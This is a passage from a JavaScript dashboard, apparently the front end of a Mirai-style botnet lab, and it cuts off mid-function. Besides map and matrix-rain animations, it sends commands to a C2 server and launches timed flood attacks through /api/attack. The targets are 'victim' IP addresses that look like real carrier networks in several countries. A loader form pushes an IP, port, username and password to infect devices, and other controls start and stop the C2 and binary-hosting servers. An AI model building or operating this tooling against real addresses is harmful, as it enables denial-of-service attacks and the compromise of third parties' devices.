/* =============================================================
   MIRAI BOT TRACKER v2.0 // app.js
   - World map canvas (equirectangular)
   - Matrix rain background
   - Country infection dot system (random red dots in bot countries)
   - Attack arc animation
   - API polling
   ============================================================= */
"use strict";

const API_BASE    = "";
const POLL_MS     = 5000;
const LOG_POLL_MS = 3000;

/* ---- LAB NODES ------------------------------------------- */
const LAB_NODES = [
  { id:"c2",    type:"attacker", label:"C2/CNC",      ip:"185.10.20.100",  lat:48.80, lon:2.35,   country:"Lab" },
  { id:"ldr",   type:"attacker", label:"LOADER",      ip:"185.10.20.200",  lat:48.85, lon:2.50,   country:"Lab" },
  { id:"bot1",  type:"bot",  label:"BOT-1 [TH]",  ip:"110.164.20.11",  lat:13.75, lon:100.52, country:"Thailand",      countryKey:"TH" },
  { id:"bot2",  type:"bot",  label:"BOT-2 [TH]",  ip:"125.20.30.11",   lat:14.00, lon:100.80, country:"Thailand",      countryKey:"TH" },
  { id:"bot3",  type:"bot",  label:"BOT-3 [US]",  ip:"66.249.64.100",  lat:37.77, lon:-122.4, country:"USA",           countryKey:"US" },
  { id:"bot4",  type:"bot",  label:"BOT-4 [KR]",  ip:"210.89.0.100",   lat:37.57, lon:126.97, country:"South Korea",   countryKey:"KR" },
  { id:"bot5",  type:"bot",  label:"BOT-5 [CN]",  ip:"114.240.0.100",  lat:39.93, lon:116.38, country:"China",         countryKey:"CN" },
  { id:"bot6",  type:"bot",  label:"BOT-6 [RU]",  ip:"95.24.0.100",    lat:55.75, lon:37.62,  country:"Russia",        countryKey:"RU" },
  { id:"bot7",  type:"bot",  label:"BOT-7 [DE]",  ip:"46.112.0.100",   lat:52.52, lon:13.40,  country:"Germany",       countryKey:"DE" },
  { id:"bot8",  type:"bot",  label:"BOT-8 [BR]",  ip:"177.0.0.100",    lat:-23.55,lon:-46.63, country:"Brazil",        countryKey:"BR" },
  { id:"bot9",  type:"bot",  label:"BOT-9 [UK]",  ip:"8.2.0.100",      lat:51.51, lon:-0.12,  country:"United Kingdom",countryKey:"UK" },
  { id:"bot10", type:"bot",  label:"BOT-10 [JP]", ip:"1.0.1.100",      lat:35.68, lon:139.69, country:"Japan",         countryKey:"JP" },
  { id:"v_us",  type:"victim", label:"VICTIM:USA",    ip:"12.1.2.100",     lat:40.71, lon:-74.01, country:"USA (AT&T)",    victimKey:"us" },
  { id:"v_cn",  type:"victim", label:"VICTIM:CN",     ip:"202.97.0.100",   lat:31.23, lon:121.47, country:"China (CT)",    victimKey:"cn" },
  { id:"v_ru",  type:"victim", label:"VICTIM:RU",     ip:"217.107.0.100",  lat:59.93, lon:30.32,  country:"Russia (RT)",   victimKey:"ru" },
  { id:"v_kp",  type:"victim", label:"VICTIM:KP",     ip:"175.45.176.100", lat:39.03, lon:125.75, country:"N.Korea",       victimKey:"kp" },
  { id:"v_ir",  type:"victim", label:"VICTIM:IR",     ip:"5.200.0.100",    lat:35.69, lon:51.42,  country:"Iran (TCI)",    victimKey:"ir" },
];

const VICTIM_MAP = {};
LAB_NODES.filter(n => n.type === "victim").forEach(v => { VICTIM_MAP[v.victimKey] = v; });

/* ---- COUNTRY BOUNDING BOXES [latMin,latMax,lonMin,lonMax] - */
/* Used for spawning random infection dots within each country  */
const COUNTRY_BOUNDS = {
  TH: { latMin:5.5,  latMax:20.5, lonMin:97.3,  lonMax:105.7 },
  US: { latMin:25.5, latMax:48.5, lonMin:-124,  lonMax:-67   },
  KR: { latMin:34.3, latMax:38.3, lonMin:126,   lonMax:129.5 },
  CN: { latMin:20,   latMax:52,   lonMin:78,    lonMax:132   },
  RU: { latMin:51,   latMax:70,   lonMin:30,    lonMax:140   },
  DE: { latMin:47.3, latMax:55,   lonMin:6.1,   lonMax:15.0  },
  BR: { latMin:-33,  latMax:4,    lonMin:-73,   lonMax:-36   },
  UK: { latMin:50,   latMax:58.5, lonMin:-8,    lonMax:1.8   },
  JP: { latMin:30,   latMax:44,   lonMin:130,   lonMax:145   },
};

/* Map botId -> countryKey */
const BOT_COUNTRIES = LAB_NODES
  .filter(n => n.type === "bot" && n.countryKey)
  .map(n => n.countryKey);

/* ---- WORLD MAP POLYGONS [lat, lon] ----------------------- */
const WORLD_POLYS = [
  { name:"northAmerica", pts:[
    [71,-163],[70,-149],[64,-166],[55,-163],
    [60,-141],[58,-137],[55,-131],[49,-124],
    [37,-122],[32,-117],[24,-110],[20,-105],[16,-92],
    [10,-83],[8,-77],[9,-83],[14,-87],[16,-92],
    [20,-87],[21,-87],[25,-77],[29,-81],[30,-82],
    [33,-81],[35,-76],[38,-75],[41,-70],[44,-66],
    [47,-53],[50,-56],[54,-58],[60,-65],[63,-68],
    [62,-78],[63,-93],[59,-94],[56,-76],[51,-80],
    [45,-76],[43,-79],[42,-83],[46,-85],[48,-89],
    [50,-91],[52,-80],[54,-70],[60,-65],[63,-68],
    [63,-75],[65,-73],[68,-66],[71,-56],[73,-74],
    [78,-65],[80,-55],[80,-90],[78,-98],[73,-75],
    [71,-75],[71,-80],[63,-80],[63,-93],[68,-135],
    [70,-118],[72,-96],[73,-95],[71,-140],[68,-166],
    [65,-168],[60,-166],[55,-163],[64,-166],[70,-149],[71,-163]
  ]},
  { name:"greenland", pts:[
    [83,-38],[80,-18],[72,-22],[69,-27],[60,-44],
    [62,-50],[60,-65],[63,-52],[67,-53],[71,-56],
    [78,-65],[80,-55],[83,-38]
  ]},
  { name:"southAmerica", pts:[
    [11,-74],[8,-77],[8,-82],[8,-77],[8,-74],[1,-50],
    [0,-50],[-1,-51],[-3,-41],[-5,-35],[-8,-35],
    [-12,-38],[-16,-39],[-20,-40],[-23,-43],[-25,-48],
    [-28,-49],[-32,-52],[-34,-54],[-38,-58],[-42,-65],
    [-48,-66],[-55,-68],[-55,-64],[-54,-67],[-52,-69],
    [-53,-71],[-43,-65],[-38,-58],[-35,-57],[-32,-51],
    [-23,-46],[-20,-41],[-16,-39],[-12,-38],[-8,-35],
    [-3,-41],[-1,-51],[0,-50],[4,-52],[5,-53],[5,-57],
    [7,-58],[8,-60],[10,-62],[11,-63],[12,-72],[11,-74]
  ]},
  { name:"europeWest", pts:[
    [71,28],[70,25],[68,14],[65,14],[63,8],[58,5],
    [55,8],[53,5],[51,2],[49,-2],[43,-9],[36,-9],
    [36,-5],[37,0],[40,0],[41,3],[43,5],[44,8],[43,12],
    [38,13],[37,15],[38,16],[39,18],[41,20],[40,22],
    [38,22],[37,27],[37,28],[39,26],[41,29],[42,28],
    [42,24],[44,22],[45,20],[44,18],[46,14],[46,13],
    [48,14],[50,14],[52,16],[54,18],[54,21],[56,24],
    [56,21],[58,22],[60,25],[60,28],[64,26],[65,25],
    [65,28],[66,29],[68,28],[70,28],[71,28]
  ]},
  { name:"asia", pts:[
    [71,28],[70,32],[67,33],[64,40],[64,43],[60,57],
    [57,58],[55,60],[53,73],[52,77],[52,80],[50,78],
    [46,62],[44,50],[41,49],[38,57],[34,61],[30,61],
    [28,64],[24,68],[22,73],[18,74],[14,75],[8,77],
    [5,80],[8,77],[10,80],[13,81],[8,93],[5,100],
    [6,100],[5,103],[1,103],[0,105],[1,110],[4,116],
    [4,108],[8,100],[14,100],[18,103],[22,110],[24,117],
    [25,122],[28,121],[33,122],[35,130],[37,130],[38,128],
    [38,132],[42,131],[44,135],[48,135],[52,141],[55,135],
    [58,136],[60,150],[60,155],[63,177],[66,170],[68,162],
    [68,148],[65,141],[63,128],[60,122],[58,111],[56,101],
    [55,84],[56,82],[54,73],[52,77],[52,80],[56,83],
    [58,70],[60,57],[64,43],[64,40],[66,33],[68,28],[71,28]
  ]},
  { name:"india", pts:[
    [24,68],[28,65],[30,61],[28,64],[24,68],
    [22,73],[18,73],[14,74],[8,77],[8,80],[10,80],
    [13,81],[18,83],[20,86],[22,88],[22,92],[20,93],
    [15,80],[12,77],[8,77],[14,75],[18,74],[22,73],[24,68]
  ]},
  { name:"africa", pts:[
    [36,-6],[36,10],[33,11],[31,32],[22,37],[12,44],
    [11,43],[11,42],[8,42],[4,42],[1,42],[-5,40],
    [-10,40],[-11,34],[-11,14],[-8,13],[-7,2],[-4,-3],
    [-4,-8],[-6,-12],[-10,-14],[-15,-12],[-17,-12],
    [-20,-13],[-26,-15],[-30,-17],[-34,-18],[-34,-26],
    [-26,-33],[-24,-35],[-26,-33],[-34,-26],[-35,-20],
    [-30,-17],[-25,-14],[-20,-12],[-15,-12],[-10,-15],
    [-6,-12],[-4,-8],[-3,-3],[-1,9],[4,10],[8,13],
    [11,14],[14,15],[18,16],[22,14],[22,37],[30,32],
    [32,22],[37,14],[40,12],[42,11],[40,12],[37,14],[36,10],[36,-6]
  ]},
  { name:"australia", pts:[
    [-10,142],[-14,126],[-16,124],[-20,114],[-24,114],
    [-28,114],[-32,116],[-34,119],[-36,137],[-38,140],
    [-38,147],[-35,151],[-32,153],[-28,154],[-24,154],
    [-20,149],[-18,146],[-15,145],[-10,142]
  ]},
  { name:"japan", pts:[
    [35,136],[34,131],[32,131],[32,132],[33,134],
    [34,135],[35,136],[36,137],[38,141],[40,141],
    [42,140],[44,143],[44,145],[42,141],[40,141],
    [38,141],[36,137],[35,136]
  ]},
  { name:"uk", pts:[
    [51,-2],[53,-3],[54,-3],[56,-5],[57,-7],
    [58,-5],[57,-3],[55,-2],[54,0],[53,0],[51,2],[51,-2]
  ]},
];

/* ---- PROJECTION ------------------------------------------ */
function project(lat, lon, w, h) {
  const ml=8,mr=8,mt=18,mb=15;
  const aw=w-ml-mr, ah=h-mt-mb;
  return {
    x: ml + (lon+180)/360 * aw,
    y: mt + (90-lat)/180 * ah
  };
}

/* ---- CANVAS ---------------------------------------------- */
const canvas = document.getElementById("world-canvas");
const ctx    = canvas.getContext("2d");
let W=0, H=0;
let projNodes = [];
let arcs = [];

function resize() {
  const r = canvas.parentElement.getBoundingClientRect();
  W = canvas.width  = Math.floor(r.width);
  H = canvas.height = Math.floor(r.height);
  initMatrix();
}

/* ---- MATRIX RAIN ----------------------------------------- */
const MATRIX_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>?][{}\\|/!;:=+-abcdefghijklmnopqrstuvwxyz".split("");
const M_COL_W = 13;
let mDrops = [];
let mAge   = [];

function initMatrix() {
  const cols = Math.ceil(W / M_COL_W);
  mDrops = Array.from({length:cols}, () => -Math.floor(Math.random()*30));
  mAge   = Array.from({length:cols}, () => 0);
}

function drawMatrix() {
  ctx.font = "11px Courier New,monospace";
  ctx.textAlign = "center";
  const cols = Math.ceil(W / M_COL_W);

  for (let i=0; i<cols; i++) {
    const x = i * M_COL_W + M_COL_W/2;
    const y = mDrops[i] * 14;

    if (y > 0 && y < H) {
      // Head char (bright)
      ctx.fillStyle = "#88ffaa";
      ctx.shadowColor = "#00ff41";
      ctx.shadowBlur = 4;
      ctx.fillText(MATRIX_CHARS[Math.floor(Math.random()*MATRIX_CHARS.length)], x, y);
      ctx.shadowBlur = 0;

      // Trailing chars (fading)
      const trailLen = 4 + Math.floor(Math.random()*4);
      for (let j=1; j<=trailLen; j++) {
        const ty = y - j*14;
        if (ty < 0) break;
        const fade = 1 - j/trailLen;
        const alpha = fade * 0.25;
        ctx.fillStyle = `rgba(0,${Math.floor(100*fade+60)},${Math.floor(20*fade)},${alpha})`;
        ctx.fillText(MATRIX_CHARS[Math.floor(Math.random()*MATRIX_CHARS.length)], x, ty);
      }
    }

    mDrops[i] += 0.6;
    if (mDrops[i]*14 > H && Math.random() > 0.96) {
      mDrops[i] = -Math.floor(Math.random()*15) - 5;
    }
  }
  ctx.textAlign = "left";
}

/* ---- INFECTION DOTS -------------------------------------- */
/*
  Each dot: { lat, lon, country, birthTime, duration, phase }
  Phases:
    0.00-0.15 : ALERT  -- bright red, fast blink
    0.15-0.60 : ACTIVE -- solid red
    0.60-1.00 : DYING  -- fade out to dark
*/
let infectionDots = [];
let totalInfectCount = 0;

function spawnInfectionDot(countryKey, delay=0) {
  const b = COUNTRY_BOUNDS[countryKey];
  if (!b) return;
  setTimeout(() => {
    const lat = b.latMin + Math.random()*(b.latMax - b.latMin);
    const lon = b.lonMin + Math.random()*(b.lonMax - b.lonMin);
    const dur = 12000 + Math.random()*18000; // 12-30s
    infectionDots.push({ lat, lon, country:countryKey, birthTime:Date.now(), duration:dur });
    totalInfectCount++;
    const el = document.getElementById("sb-infect-count");
    if (el) el.textContent = totalInfectCount;
    termLog(`[INF] NEW_BOT country=${countryKey} pos=${lat.toFixed(2)},${lon.toFixed(2)}`, "inf");
  }, delay);
}

function spawnBurst(countryKey, count=2) {
  for (let i=0; i<count; i++) {
    spawnInfectionDot(countryKey, i * (200 + Math.random()*400));
  }
}

function drawInfectionDots() {
  const now = Date.now();
  const live = [];

  for (const dot of infectionDots) {
    const age  = now - dot.birthTime;
    if (age > dot.duration) continue;
    live.push(dot);

    const prog = age / dot.duration;
    const {x,y} = project(dot.lat, dot.lon, W, H);

    let alpha, radius, col;

    if (prog < 0.15) {
      // ALERT: fast red blink
      const blink = Math.sin(now / 80) * 0.5 + 0.5;
      alpha  = 0.6 + blink*0.4;
      radius = 3 + blink*1.5;
      col    = "#ff0000";
    } else if (prog < 0.6) {
      // ACTIVE: solid red dot
      alpha  = 0.85;
      radius = 2.5;
      col    = "#ff2222";
    } else {
      // DYING: fade
      alpha  = (1 - (prog-0.6)/0.4) * 0.6;
      radius = 2;
      col    = "#aa1111";
    }

    ctx.save();
    ctx.globalAlpha = alpha;

    // Outer glow
    ctx.beginPath();
    ctx.arc(x, y, radius+3, 0, Math.PI*2);
    ctx.fillStyle = col + "30";
    ctx.fill();

    // Core dot
    ctx.beginPath();
    ctx.arc(x, y, radius, 0, Math.PI*2);
    ctx.fillStyle = col;
    ctx.shadowColor = col;
    ctx.shadowBlur = prog < 0.15 ? 10 : 5;
    ctx.fill();
    ctx.shadowBlur = 0;

    ctx.restore();
  }

  infectionDots = live;
}

/* ---- AUTO-SPAWN INFECTION DEMO --------------------------- */
function autoSpawnDemo() {
  // Pick 1-2 random bot countries and spawn dots
  const keys = Object.keys(COUNTRY_BOUNDS);
  const n = 1 + Math.floor(Math.random() * 2);
  for (let i=0; i<n; i++) {
    const k = keys[Math.floor(Math.random()*keys.length)];
    spawnInfectionDot(k, i * 800 + Math.random()*600);
  }
}
// Spawn initial dots on load
setTimeout(() => {
  Object.keys(COUNTRY_BOUNDS).forEach((k,i) => {
    spawnInfectionDot(k, 500 + i*400);
  });
}, 2000);
// Periodic auto-spawn
setInterval(autoSpawnDemo, 6000);

/* ---- ATTACK ARCS ----------------------------------------- */
function bezierPt(p0,p1,p2,t){ return (1-t)*(1-t)*p0 + 2*(1-t)*t*p1 + t*t*p2; }

function drawArcs() {
  const now  = Date.now();
  const live = [];

  for (const arc of arcs) {
    const age = (now - arc.startTime)/1000;
    if (arc.startTime > now) { live.push(arc); continue; }
    if (age > arc.duration + 1.5) continue;
    live.push(arc);

    const {fx,fy,tx,ty} = arc;
    const mx = (fx+tx)/2;
    const my = (fy+ty)/2 - Math.hypot(tx-fx,ty-fy)*0.36;
    const prog = Math.min(age/arc.duration, 1);

    const ex = bezierPt(fx,mx,tx,prog);
    const ey = bezierPt(fy,my,ty,prog);

    ctx.save();
    ctx.strokeStyle = "#ff2222";
    ctx.lineWidth   = 1.2;
    ctx.shadowColor = "#ff2222";
    ctx.shadowBlur  = 6;
    ctx.setLineDash([5,4]);
    ctx.lineDashOffset = -(now/35) % 9;

    ctx.beginPath();
    ctx.moveTo(fx,fy);
    ctx.quadraticCurveTo(mx,my,ex,ey);
    ctx.stroke();
    ctx.setLineDash([]);

    ctx.beginPath();
    ctx.arc(ex,ey,2.5,0,Math.PI*2);
    ctx.fillStyle="#ff5555";
    ctx.fill();
    ctx.restore();
  }
  arcs = live;
}

/* ---- DRAW MAP -------------------------------------------- */
function drawMap() {
  ctx.fillStyle = "#000008";
  ctx.fillRect(0,0,W,H);

  // Matrix rain (ocean areas)
  drawMatrix();

  // Continent fills (solid, over rain)
  for (const poly of WORLD_POLYS) {
    ctx.beginPath();
    let first=true;
    for (const [lat,lon] of poly.pts) {
      const {x,y} = project(lat,lon,W,H);
      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
    }
    ctx.closePath();
    ctx.fillStyle = "#010d01";
    ctx.fill();
  }

  // Continent borders
  ctx.strokeStyle = "#009a18";
  ctx.lineWidth   = 0.7;
  ctx.shadowColor = "#00ff4140";
  ctx.shadowBlur  = 2;
  for (const poly of WORLD_POLYS) {
    ctx.beginPath();
    let first=true;
    for (const [lat,lon] of poly.pts) {
      const {x,y} = project(lat,lon,W,H);
      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
    }
    ctx.closePath();
    ctx.stroke();
  }
  ctx.shadowBlur = 0;
}

/* ---- DRAW NODES ------------------------------------------ */
const NODE_STYLE = {
  attacker:{ fill:"#ffe033", glow:"#ffe03380", r:6 },
  bot:     { fill:"#00ff41", glow:"#00ff4180", r:4 },
  victim:  { fill:"#ff2222", glow:"#ff222280", r:5 },
};

function drawNodes() {
  projNodes = [];
  const now = Date.now();

  for (const node of LAB_NODES) {
    const {x,y} = project(node.lat, node.lon, W, H);
    const s = NODE_STYLE[node.type];

    // Halo
    ctx.beginPath(); ctx.arc(x,y,s.r+3,0,Math.PI*2);
    ctx.fillStyle=s.glow; ctx.fill();

    // Core
    ctx.beginPath(); ctx.arc(x,y,s.r,0,Math.PI*2);
    ctx.fillStyle   = s.fill;
    ctx.shadowColor = s.fill;
    ctx.shadowBlur  = 10;
    ctx.fill();
    ctx.shadowBlur  = 0;

    // Pulse ring
    const phase = ((now/1600) + node.lat*0.08) % 1;
    const pr    = s.r + 2 + phase*9;
    const pa    = 1 - phase;
    ctx.beginPath(); ctx.arc(x,y,pr,0,Math.PI*2);
    ctx.strokeStyle = s.fill + Math.floor(pa*200).toString(16).padStart(2,"0");
    ctx.lineWidth=0.8; ctx.stroke();

    projNodes.push({...node, px:x, py:y, hr:s.r+7});
  }
}

/* ---- DRAW LABELS ----------------------------------------- */
function drawLabels() {
  ctx.font = "8px Courier New,monospace";
  ctx.textAlign = "left";
  for (const n of projNodes) {
    const s = NODE_STYLE[n.type];
    ctx.fillStyle   = s.fill;
    ctx.shadowColor = s.fill;
    ctx.shadowBlur  = 3;
    ctx.fillText(n.label, n.px + n.hr, n.py + 3);
    ctx.shadowBlur = 0;
  }
}

/* ---- MAIN DRAW LOOP -------------------------------------- */
function drawFrame() {
  ctx.clearRect(0,0,W,H);
  drawMap();
  drawInfectionDots();
  drawArcs();
  drawNodes();
  drawLabels();
  requestAnimationFrame(drawFrame);
}

/* ---- TOOLTIP --------------------------------------------- */
const tooltip = document.getElementById("node-tooltip");
const ttTitle = document.getElementById("tt-title");
const ttIp    = document.getElementById("tt-ip");
const ttRole  = document.getElementById("tt-role");

canvas.addEventListener("mousemove", e => {
  const r  = canvas.getBoundingClientRect();
  const mx = e.clientX - r.left;
  const my = e.clientY - r.top;
  let hit = null;
  for (const n of projNodes) {
    if (Math.hypot(mx-n.px, my-n.py) < n.hr) { hit=n; break; }
  }
  if (hit) {
    ttTitle.textContent = "NODE:" + hit.label;
    ttIp.textContent    = "IP:" + hit.ip;
    ttRole.textContent  = hit.country + " [" + hit.type.toUpperCase() + "]";
    ttRole.style.color  = NODE_STYLE[hit.type].fill;
    let tx = mx+12; if(tx+170>W) tx=mx-175;
    tooltip.style.left = tx+"px";
    tooltip.style.top  = (my-8)+"px";
  } else {
    tooltip.style.top = "-999px";
  }
});
canvas.addEventListener("mouseleave",()=>{ tooltip.style.top="-999px"; });

/* ---- FIRE ARCS ------------------------------------------- */
function fireArcs(victimKey, duration) {
  const victim = VICTIM_MAP[victimKey];
  if (!victim) return;
  const {x:tx,y:ty} = project(victim.lat, victim.lon, W, H);
  const bots = LAB_NODES.filter(n=>n.type==="bot");
  const t0   = Date.now();
  bots.forEach((bot,i) => {
    const {x:fx,y:fy} = project(bot.lat,bot.lon,W,H);
    arcs.push({
      fx,fy,tx,ty,
      startTime: t0 + i*100,
      duration: Math.max(duration/3, 4),
    });
  });
}

/* ---- NODE LIST ------------------------------------------- */
function buildNodeList() {
  const list = document.getElementById("node-list");
  list.innerHTML = "";
  for (const node of LAB_NODES) {
    const div = document.createElement("div");
    div.className = "nl-item";
    div.title = node.ip+" -- "+node.country;
    div.innerHTML =
      "<span class='nl-dot dot-"+node.type+"'></span>"+
      "<span class='nl-name'>"+node.label+"</span>"+
      "<span class='nl-ip'>"+node.ip+"</span>";
    div.addEventListener("click", () => {
      // Flash circle at node location
      const {x,y} = project(node.lat, node.lon, W, H);
      let n=0;
      const id=setInterval(()=>{
        if(n++>5){clearInterval(id);return;}
        ctx.beginPath();ctx.arc(x,y,16+n*5,0,Math.PI*2);
        ctx.strokeStyle=NODE_STYLE[node.type].fill+"60";
        ctx.lineWidth=1.5;ctx.stroke();
      },70);
    });
    list.appendChild(div);
  }
}

/* ---- TABS ------------------------------------------------ */
document.querySelectorAll(".tab").forEach(btn=>{
  btn.addEventListener("click",()=>{
    document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
    document.querySelectorAll(".tab-content").forEach(t=>t.classList.add("hidden"));
    btn.classList.add("active");
    document.getElementById("tab-"+btn.dataset.tab).classList.remove("hidden");
  });
});

/* ---- CLOCK ----------------------------------------------- */
function updateClock(){
  document.getElementById("hdr-clock").textContent = new Date().toTimeString().slice(0,8);
}
setInterval(updateClock,1000); updateClock();

/* ---- TOAST ----------------------------------------------- */
function toast(msg, err=false){
  const el=document.createElement("div");
  el.className="toast"+(err?" err":"");
  el.textContent=msg;
  document.getElementById("toasts").appendChild(el);
  setTimeout(()=>el.remove(),4000);
}

/* ---- TERMINAL LOG ---------------------------------------- */
function termLog(msg, cls="sys"){
  const term=document.getElementById("terminal");
  const line=document.createElement("div");
  line.className="tline "+cls;
  line.textContent=msg;
  term.appendChild(line);
  term.scrollTop=term.scrollHeight;
  while(term.children.length>200) term.removeChild(term.firstChild);
}
document.getElementById("btn-clear-log").addEventListener("click",()=>{
  document.getElementById("terminal").innerHTML="";
});

/* ---- STATUS APPLY ---------------------------------------- */
let _lastBotTotal = 0;

function applyStatus(data){
  const cncUp = !!data.cnc_up;
  const bots  = data.bot_total ?? 0;
  const peers = data.tcp_peers ?? "--";

  // Detect bot count increase -> spawn infection events
  if (bots > _lastBotTotal && _lastBotTotal >= 0) {
    const diff = bots - _lastBotTotal;
    // Spawn dots across random bot countries
    for(let i=0;i<Math.min(diff,3);i++){
      const k = BOT_COUNTRIES[Math.floor(Math.random()*BOT_COUNTRIES.length)];
      spawnBurst(k, 1+Math.floor(Math.random()*2));
    }
  }
  _lastBotTotal = bots;

  document.getElementById("hdr-bot-count").textContent = String(bots).padStart(3,"0");
  document.getElementById("hdr-peers").textContent = peers;

  const chip = document.getElementById("hdr-cnc-status");
  chip.textContent = cncUp?"[CNC:UP]":"[CNC:DOWN]";
  chip.className   = "hdr-chip "+(cncUp?"chip-up":"chip-down");

  document.getElementById("led-cnc").className = "led"+(cncUp?" on":"");
  document.getElementById("sb-cnc-text").textContent = cncUp?"UP":"DOWN";
  document.getElementById("sb-bot-text").textContent = bots;
  document.getElementById("led-bots").className = "led"+(bots>0?" on":"");
  document.getElementById("sb-last-poll").textContent = new Date().toTimeString().slice(0,8);

  if(data.error && !cncUp) termLog("[ERR] "+data.error,"err");
}

/* ---- API POLLS ------------------------------------------- */
async function pollStatus(){
  try{
    const r=await fetch(API_BASE+"/api/status");
    if(!r.ok) throw new Error("HTTP "+r.status);
    applyStatus(await r.json());
  }catch{}
}
async function pollLogs(){
  try{
    const r=await fetch(API_BASE+"/api/logs");
    if(!r.ok) return;
    const d=await r.json();
    (d.logs||[]).slice(-8).forEach(l=>{
      const cls=l.includes("[ERR]")?"err":l.includes("[CMD]")?"cmd":l.includes("[OK]")?"ok":"sys";
      termLog(l,cls);
    });
  }catch{}
}
async function pollOverview(){
  try{
    const r=await fetch(API_BASE+"/api/lab/overview");
    if(!r.ok) return;
    const d=await r.json();
    const agentOk=d.loader_agent?.ok;
    const httpOk=d.loader?.http?.running;
    document.getElementById("led-agent").className="led led-yellow"+(agentOk?" on":"");
    document.getElementById("sb-agent-text").textContent=agentOk?"UP":"DOWN";
    document.getElementById("led-http").className="led led-blue"+(httpOk?" on":"");
    document.getElementById("sb-http-text").textContent=httpOk?"UP":"DOWN";
  }catch{}
}

/* ---- CNC COMMAND ----------------------------------------- */
async function sendCommand(cmd){
  if(!cmd.trim()) return;
  termLog("[CMD] >> "+cmd,"cmd");
  const out=document.getElementById("cmd-output");
  out.textContent="> SENDING...";
  try{
    const r=await fetch(API_BASE+"/api/command",{
      method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({command:cmd})
    });
    const d=await r.json();
    const txt=d.response||(d.error?"[ERR] "+d.error:"[no output]");
    out.textContent=txt;
    if(d.bot_total!==undefined)
      document.getElementById("hdr-bot-count").textContent=String(d.bot_total).padStart(3,"0");
    termLog("[CNC] "+txt.slice(0,120),d.ok?"ok":"err");
    toast(d.ok?"OK: cmd sent":"ERR: "+d.error,!d.ok);
  }catch(e){
    out.textContent="[ERR] "+e.message;
    toast("FETCH ERR",true);
  }
}
document.getElementById("cmd-input").addEventListener("keydown",e=>{
  if(e.key==="Enter") sendCommand(e.target.value);
});
document.getElementById("btn-send").addEventListener("click",()=>{
  sendCommand(document.getElementById("cmd-input").value);
});
document.querySelectorAll(".btn-quick").forEach(b=>{
  b.addEventListener("click",()=>{
    document.getElementById("cmd-input").value=b.dataset.cmd;
    sendCommand(b.dataset.cmd);
  });
});

/* ---- ATTACK BUTTONS -------------------------------------- */
document.querySelectorAll(".btn-atk").forEach(btn=>{
  btn.addEventListener("click",async()=>{
    const victim  = btn.dataset.victim;
    const method  = btn.dataset.method;
    const dur     = parseInt(btn.dataset.duration);
    const vnode   = VICTIM_MAP[victim];
    if(!vnode) return;

    // Visual: highlight row
    const row = btn.closest(".atk-row");
    if(row) row.classList.add("firing");
    document.getElementById("atk-status").textContent=
      "> LAUNCHING: "+method.toUpperCase()+" >> "+vnode.ip+" // "+dur+"s";

    // Fire arcs
    fireArcs(victim, dur);

    // Also spawn some infection dots when attacking
    const attackerBotCountries = BOT_COUNTRIES.slice(0, 4);
    attackerBotCountries.forEach((k,i) => spawnInfectionDot(k, i*300));

    try{
      const r=await fetch(API_BASE+"/api/attack",{
        method:"POST",headers:{"Content-Type":"application/json"},
        body:JSON.stringify({target:victim,method,duration:dur,dport:80,ip:vnode.ip})
      });
      const d=await r.json();
      const ok=d.ok!==false;
      toast(ok?"ATK_SENT: "+method.toUpperCase()+" >> "+vnode.label:"ATK_ERR: "+d.error,!ok);
      termLog("[ATK] "+method+" "+vnode.ip+" "+dur+"s >> "+(ok?"OK":"ERR: "+d.error),ok?"cmd":"err");
    }catch(e){ toast("FETCH ERR",true); }

    setTimeout(()=>{
      if(row) row.classList.remove("firing");
      document.getElementById("atk-status").textContent="> STANDBY...";
    }, dur*1000+500);
  });
});

/* ---- LAB CONTROLS ---------------------------------------- */
async function labPost(path,body={}){
  try{
    const r=await fetch(API_BASE+path,{
      method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)
    });
    return await r.json();
  }catch(e){ return{ok:false,error:e.message}; }
}
document.getElementById("btn-cnc-start").addEventListener("click",async()=>{
  toast(">> INIT CNC...");
  const d=await labPost("/api/lab/cnc/start");
  toast(d.ok?"CNC.UP":"CNC.ERR: "+d.error,!d.ok);
  pollStatus();
});
document.getElementById("btn-cnc-stop").addEventListener("click",async()=>{
  const d=await labPost("/api/lab/cnc/stop");
  toast(d.ok?"CNC.KILLED":"ERR: "+d.error,!d.ok);
  pollStatus();
});
document.getElementById("btn-http-start").addEventListener("click",async()=>{
  toast(">> HTTP BINS UP...");
  const d=await labPost("/api/lab/http/start");
  toast(d.ok?"HTTP.UP":"HTTP.ERR: "+d.error,!d.ok);
  pollOverview();
});
document.getElementById("btn-http-stop").addEventListener("click",async()=>{
  const d=await labPost("/api/lab/http/stop");
  toast(d.ok?"HTTP.DOWN":"ERR: "+d.error,!d.ok);
  pollOverview();
});
document.getElementById("btn-refresh").addEventListener("click",()=>{
  pollStatus();pollLogs();pollOverview();
  toast(">> SYNC...");
});

/* ---- LOADER FORM ----------------------------------------- */
document.getElementById("loader-form").addEventListener("submit",async e=>{
  e.preventDefault();
  const ip  = document.getElementById("ldr-ip").value.trim();
  const port= parseInt(document.getElementById("ldr-port").value);
  const user= document.getElementById("ldr-user").value.trim();
  const pass= document.getElementById("ldr-pass").value;
  const log = document.getElementById("loader-log");
  log.textContent="> LOADER.EXE "+ip+":"+port+" user="+user+"\n> WAIT UP TO 120s...";
  toast("LDR >> "+ip);
  try{
    const r=await fetch(API_BASE+"/api/lab/loader/run",{
      method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ip,port,user,pass})
    });
    const d=await r.json();
    log.textContent=d.ok?"> RUNNING: "+d.target+"\n":">[ERR] "+d.error;
    toast(d.ok?"LDR.RUNNING":"LDR.ERR: "+d.error,!d.ok);
    let polls=0;
    const iv=setInterval(async()=>{
      if(++polls>24){clearInterval(iv);return;}
      try{
        const lr=await fetch(API_BASE+"/api/lab/loader/log");
        const ld=await lr.json();
        const st=ld.loader||{};
        log.textContent=
          "> STATUS running="+st.running+
          "\n> TARGET "+st.target+
          "\n> EXIT "+(st.exit_code??'--')+
          "\n\n"+(st.log_tail||"");
        log.scrollTop=log.scrollHeight;
        if(st.ok_line){
          toast("OK! "+st.ok_line);
          clearInterval(iv);
          // On OK, spawn infection dot for all Thai bots (lab targets)
          spawnBurst("TH", 3);
          pollStatus();
        }
